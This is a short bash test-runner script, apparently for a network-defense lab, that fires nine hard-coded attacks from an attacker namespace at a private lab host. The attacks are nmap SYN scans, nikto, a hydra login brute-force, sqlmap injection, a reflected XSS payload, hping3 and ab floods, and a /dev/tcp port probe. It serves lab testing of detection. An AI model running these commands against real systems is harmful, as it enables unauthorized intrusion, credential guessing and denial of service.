#!/usr/bin/env bash
# 唯一主动测试入口：测试编号写死命令与目标，不接受任意地址。
set -euo pipefail
NS=nw-attacker
T=${1:-}
case "$T" in
  t1) sudo ip netns exec $NS nmap -sS -Pn -p 1-1024 --min-rate 200 --max-retries 1 10.200.0.1 ;;
  t2) sudo ip netns exec $NS nikto -h http://10.200.0.1:8081 -Tuning 123b -maxtime 12s -nointeractive ;;
  t3) sudo ip netns exec $NS hydra -l demo -P data/wordlists/lab10.txt -t 4 -f -I \
        -s 8081 10.200.0.1 http-post-form "/login:user=^USER^&password=^PASS^:F=401" ;;
  t4) sudo ip netns exec $NS sqlmap -u "http://10.200.0.1:8081/lab/item?id=1" \
        --batch --level 1 --risk 1 --technique=BEU --timeout 10 --retries 0 \
        --user-agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" ;;
  t5) sudo ip netns exec $NS curl -s "http://10.200.0.1:8081/lab/echo?q=%3Cscript%3Ealert(1)%3C/script%3E" ;;
  t6) sudo ip netns exec $NS hping3 -S -c 2000 -i u2000 -p 8081 10.200.0.1 ;;
  t7) sudo ip netns exec $NS ab -n 2000 -c 50 http://10.200.0.1:8081/ ;;
  t8) sudo ip netns exec $NS timeout 3 bash -c "echo > /dev/tcp/10.200.0.1/22" && echo "SSH_REACHABLE" ;;
  t9) sudo ip netns exec $NS nmap -sS -Pn -p 1-100 --min-rate 200 10.200.0.1 ;;
  *) echo "用法: $0 {t1..t9}" >&2; exit 2 ;;
esac
